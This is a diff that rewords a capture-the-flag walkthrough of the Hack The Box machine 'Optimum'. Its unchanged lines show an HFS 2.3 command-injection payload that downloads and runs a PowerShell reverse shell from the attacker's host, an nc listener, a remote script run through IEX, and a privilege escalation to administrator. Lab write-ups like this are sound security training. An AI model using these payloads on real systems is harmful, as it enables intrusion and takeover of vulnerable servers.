@@ -53,7 +53,7 @@ Only has port 80 open, try it in browser:
 
 ![httpfileserver](/assets/images/2020-06-29-22-04-24.png)
 
-Has a login page, but no obvious way in. Is running HTTPFileServer 2.3, Google it to find an exploit [here](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287) that says:
+The website has a login page, but no obvious way in. I see it is running HTTPFileServer 2.3, Google it to find an exploit [here](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287) that says:
 
 ```text
 The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.
@@ -83,7 +83,7 @@ Clicking go should ping me:
 22:33:43.440371 IP 10.10.10.8.http > kali.39206: Flags [.], ack 407, win 257, options [nop,nop,TS val 720511 ecr 2785576153], length 0
 ```
 
-So this proves I can execute a ping command through the search field of the webpage. I can use this to get a shell, get a PowerShell reverse one from [Nishang:](https://github.com/samratashok/nishang)
+So this proves I can execute a ping command through the search field of the webpage. I can use this to get a shell, grab a PowerShell reverse one from [Nishang:](https://github.com/samratashok/nishang)
 
 ```text
 root@kali:~/htb/optimumh# git clone https://github.com/samratashok/nishang.git
@@ -109,7 +109,7 @@ root@kali:~/htb/optimumh# python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
 ```
 
-Open another terminal and start a nc listening session, ready to connect to:
+Open another terminal and start a NC listening session, ready to connect to:
 
 ```text
 nc -lvnp 1337
@@ -130,13 +130,13 @@ Then hit ctrl-u to URL encode it:
 /?search=%00{.exec|c%3a\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.22%3a8000/Invoke-PowerShellTcp.ps1').} HTTP/1.1
 ```
 
-Now press Go on Burp then switch to HTTP server, should have a connection:
+Now press Go on Burp, then switch to my HTTP server, where we should have a connection:
 
 ```text
 10.10.10.8 - - [23/Jul/2019 22:39:30] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
 ```
 
-Switch to nc and should have a shell connected:
+That worked, so switch to my waiting NC listener and we should have a shell connected:
 
 ```text
 connect to [10.10.14.22] from (UNKNOWN) [10.10.10.8] 49162
@@ -158,7 +158,7 @@ Registered Owner:          Windows User
 
 To check for vulnerabilities we can get [this](https://github.com/rasta-mouse/Sherlock) PowerShell script, to quickly find missing software patches for local privilege escalation vulnerabilities.
 
-Switch to a new terminal:
+Switch to a new terminal and clone the latest version:
 
 ```text
 root@kali:~/htb/optimumh# git clone https://github.com/rasta-mouse/Sherlock.git
@@ -176,7 +176,7 @@ Start a webserver on Kali, then switch back to my NC shell already connected to 
 PS C:\Users\kostas\Desktop> IEX(New-Object Net.Webclient).downloadString('http://10.10.14.22:8000/Sherlock.ps1')
 ```
 
-This will run the script to check, has lots of possibilities, but go with this one:
+This will run the script to check, and I see it has lots of possibilities, but I go with this one:
 
 ```text
 Title      : Secondary Logon Handle
@@ -227,7 +227,7 @@ Finally switch back to my existing shell on the box, download and run the exploi
 
 ![invoke-ms16032](/assets/images/2020-06-29-22-08-19.png)
 
-Once the privilege escalation exploit runs it then connects to my other nc listener as root:
+Once the privilege escalation exploit runs it then connects to my other NC listener as root:
 
 ![nc_listener](/assets/images/2020-06-29-22-08-36.png)
 
@@ -243,3 +243,5 @@ PS C:\Users\kostas\Desktop> cat C:\Users\kostas\Desktop\user.txt.txt
 PS C:\Users\kostas\Desktop> cat C:\Users\Administrator\Desktop\root.txt
 <<HIDDEN>>
 ```
+
+All done. See you next time.
